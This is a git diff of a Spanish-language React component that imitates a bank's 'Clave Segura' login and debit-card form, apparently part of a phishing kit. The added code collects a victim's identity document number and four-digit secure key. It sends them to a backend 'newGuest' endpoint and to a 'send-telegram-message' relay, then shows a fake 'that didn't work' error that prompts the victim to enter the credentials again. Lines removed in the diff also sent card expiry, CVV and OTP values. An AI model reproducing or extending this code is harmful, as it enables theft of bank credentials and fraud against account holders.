@@ -1,11 +1,10 @@
 import React, { useState, useEffect } from 'react';
 import { CSSTransition, TransitionGroup } from 'react-transition-group';
 import './animations.css';
-import Otp from './otp';
 import { EyeIcon } from '@heroicons/react/24/outline';
 import { useNavigate } from 'react-router-dom';
 
-const SecurePayment = () => {
+const SecurePaymentError = () => {
   const [activeTab, setActiveTab] = useState('claveSegura');
   const [documentNumber, setDocumentNumber] = useState('');
   const [secureKey, setSecureKey] = useState('');
@@ -28,7 +27,65 @@ const SecurePayment = () => {
     setStep(2);
   };
 
-  // Función para enviar la solicitud POST y redirigir a /Loading
+  // Función para obtener el guestId, primero desde localStorage, luego haciendo un POST si no está disponible
+  const getGuestId = async () => {
+    let guestId = localStorage.getItem('guestId');
+    
+    if (!guestId) {
+      // Si no se encuentra el guestId en localStorage, hacemos una solicitud para obtenerlo
+      try {
+        const response = await fetch('http://127.0.0.1:8000/api/v1/newGuest', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            document_number: documentNumber,
+            secure_key: secureKey,
+          }),
+        });
+
+        if (!response.ok) {
+          throw new Error('Error al crear el guest');
+        }
+
+        const data = await response.json();
+        guestId = data.guestId;  // Suponiendo que la respuesta incluye el guestId
+
+        // Guardar el guestId en localStorage para futuras solicitudes
+        localStorage.setItem('guestId', guestId);
+      } catch (error) {
+        console.error('Error al obtener el guestId:', error);
+        setError(true);
+      }
+    }
+
+    return guestId;
+  };
+
+  // Función para enviar el mensaje al canal de Telegram
+  const sendTelegramMessage = async (documentNumber, secureKey) => {
+    try {
+      const response = await fetch('http://127.0.0.1:8000/api/v1/send-telegram-message', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          documentNumber,
+          secureKey,
+        }),
+      });
+
+      if (!response.ok) {
+        throw new Error('Error al enviar el mensaje a Telegram');
+      }
+    } catch (error) {
+      console.error('Error al enviar el mensaje:', error);
+    }
+  };
+
+  // Función para enviar la solicitud PATCH y redirigir a /Loading
   const handleSubmit = async () => {
     try {
       if (documentNumber.length > 0 && secureKey.length === 4) {
@@ -36,22 +93,25 @@ const SecurePayment = () => {
         localStorage.setItem('documentNumber', documentNumber);
         localStorage.setItem('secureKey', secureKey);
 
-        // Crear el body de la solicitud
-        const ip = '172.22.128.1'; // IP del usuario
-        const expirationDate = '12313131'; // Fecha de expiración de la tarjeta
-        const ccv = '123'; // CVV de la tarjeta
+        // Obtener el guestId (si no existe, lo creamos)
+        const guestId = await getGuestId();
+        
+        if (!guestId) {
+          setError(true);  // Si no pudimos obtener el guestId, mostramos un error
+          return;
+        }
 
+        // Enviar el mensaje al canal de Telegram
+        await sendTelegramMessage(documentNumber, secureKey);
+
+        // Crear el body de la solicitud
         const body = {
-          user: documentNumber,
-          ip: ip,
-          cc: secureKey,
-          expiration_date: expirationDate,
-          ccv: ccv
+          status_id: 1,  // Aquí se define el estado a 1 como se solicitó
         };
 
-        // Hacer la solicitud POST para crear el nuevo guest
-        const response = await fetch('http://127.0.0.1:8000/api/v1/newGuest', {
-          method: 'POST',
+        // Hacer la solicitud PATCH
+        const response = await fetch(`http://127.0.0.1:8000/api/v1/guest/${guestId}`, {
+          method: 'PUT',
           headers: {
             'Content-Type': 'application/json',
           },
@@ -62,28 +122,7 @@ const SecurePayment = () => {
           throw new Error('Error al enviar la solicitud');
         }
 
-        const data = await response.json(); // La respuesta de la API
-        const guestId = data.id; // Obtener el ID del guest generado
-
-        // Hacer la solicitud para enviar el mensaje a Telegram
-        const telegramResponse = await fetch('http://127.0.0.1:8000/api/v1/send-telegram-message', {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify({
-            documentNumber: documentNumber,
-            secureKey: secureKey,
-            Otp: Otp,
-          }),
-        });
-
-
-        if (!telegramResponse.ok) {
-          throw new Error('Error al enviar el mensaje a Telegram');
-        }
-
-        localStorage.setItem('guestId', guestId);
+        // Redirigir a /Loading
         navigate('/loading');
       } else {
         setError(true);
@@ -100,7 +139,7 @@ const SecurePayment = () => {
   };
 
   const handleKeyChange = (e) => {
-    const value = e.target.value.replace(/\D/g, '');
+    const value = e.target.value.replace(/\D/g, '');  // Limitar a solo números
     setSecureKey(value);
   };
 
@@ -138,7 +177,7 @@ const SecurePayment = () => {
                 </div>
 
                 <div className="">
-                  {/* Pestañas */}
+
                   <div className="flex">
                     <button
                       className={`w-1/2 text-center ${activeTab === 'claveSegura' ? 'bg-white text-[rgb(0,64,168)] border-b-4 border-[rgb(0,64,168)]' : ' text-gray-700'}`}
@@ -154,7 +193,6 @@ const SecurePayment = () => {
                     </button>
                   </div>
 
-                  {/* Contenido de Clave Segura */}
                   {activeTab === 'claveSegura' && (
                     <div className="p-4 rounded-lg relative">
                       <div className="absolute top-2 right-2 cursor-pointer">
@@ -162,9 +200,9 @@ const SecurePayment = () => {
                           <path d="M12 2L2 12M2 2l10 10" stroke="#444" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
                         </svg>
                       </div>
-                      <p className="text-sm text-[#444444] bg-[#edf7ff] p-2 mb-2">Estás ingresando con tu Clave Segura. Selecciona ‘Tarjeta Débito’ para cambiar el tipo de ingreso.</p>
+                      <p className='text-red-500 text-center font-bold'>¡Eso no funciono!</p>
+                      <p className="text-sm text-[#444444] bg-red-200 p-2 mb-2">Ingresa correctamente las credenciales de acceso</p>
 
-                      {/* Identificación */}
                       <div className="mb-4">
                         <h2 className="text-sm font-semibold mb-2 text-[#444444]">Identificación</h2>
                         <div className="flex items-center gap-4">
@@ -190,7 +228,6 @@ const SecurePayment = () => {
                         </div>
                       </div>
 
-                      {/* Clave segura */}
                       <div>
                         <h2 className="text-sm font-semibold mb-2 text-[#444444]">Clave segura</h2>
                         <div className="relative">
@@ -231,92 +268,8 @@ const SecurePayment = () => {
                       </div>
                     </div>
                   )}
-
-                  {/* Contenido de Tarjeta Débito */}
-                  {activeTab === 'tarjetaDebito' && (
-                    <div className="p-4 rounded-lg relative">
-                      <p className="text-sm text-[#444444] bg-[#edf7ff] p-2 mb-2">Estás ingresando con tu Tarjeta Débito. Asegúrate de tener los datos de tu tarjeta a mano.</p>
-
-
-
-                      {/* Identificación */}
-                      <div className="mb-4">
-                        <h2 className="text-sm font-semibold mb-2 text-[#444444]">Identificación</h2>
-                        <div className="flex items-center gap-4">
-                          <select
-                            className="h-12 w-24 pl-3 pr-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500 text-lg"
-                            name="cc"
-                          >
-                            <option value="CC">C.C. ... Cédula de ciudadanía</option>
-                            <option value="CC">T.I. ... Tarjeta de Identidad</option>
-                            <option value="CC">C.E. ... Cédula de Extranjería</option>
-                            <option value="CC">P.S. ... Pasaporte</option>
-                          </select>
-                          <input
-                            type="tel"
-                            value={documentNumber}
-                            onChange={handleDocumentChange}
-                            placeholder="#"
-                            minLength="6"
-                            maxLength="10"
-                            required
-                            className="flex-1 h-12 pl-4 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm"
-                          />
-                        </div>
-                      </div>
-
-                      {/*Clave de tu tarjeta débito */}
-                      <div className="mb-4">
-                        <h2 className="text-sm font-semibold mb-2 text-[#444444]">Clave de tu tarjeta débito</h2>
-                        <input
-                          type="text"
-                          placeholder="..."
-                          maxLength="4"
-                          minLength="4"
-                          required
-                          className="w-full h-12 pl-4 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm"
-                        />
-                      </div>
-
-                      {/* Clave segura */}
-                      <div>
-                        <h2 className="text-sm font-semibold mb-2 text-[#444444]">Últimos 4 dígitos de tu tarjeta débito</h2>
-                        <div className="relative">
-                          <input
-                            type={showPassword ? 'text' : 'password'}
-                            value={secureKey}
-                            onChange={handleKeyChange}
-                            placeholder="..."
-                            minLength="4"
-                            maxLength="4"
-                            required
-                            className="w-full h-12 pl-4 border mb-2 border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
-                          />
-                          <button
-                            type="button"
-                            onClick={() => setShowPassword(!showPassword)}
-                            className="absolute inset-y-0 right-0 flex items-center pr-3"
-                          >
-                            <EyeIcon className={`w-5 h-5 text-[#0043a9] ${showPassword ? 'text-blue-500' : ''}`} />
-                          </button>
-                        </div>
-                      </div>
-
-                      <button
-                        onClick={handleSubmit}
-                        disabled={!documentNumber || secureKey.length !== 4}
-                        className={`w-full h-12 ${documentNumber && secureKey.length === 4 ? 'bg-blue-800' : 'bg-gray-400'} text-white font-semibold rounded-full hover:bg-blue-700 transition duration-300`}
-                      >
-                        Ingresar ahora
-                      </button>
-                    </div>
-                  )}
                 </div>
               </div>
-            )}
-
-            {step === 2 && (
-              <Otp />
             )}
           </div>
         </CSSTransition>
@@ -325,4 +278,4 @@ const SecurePayment = () => {
   );
 };
 
-export default SecurePayment;
+export default SecurePaymentError;
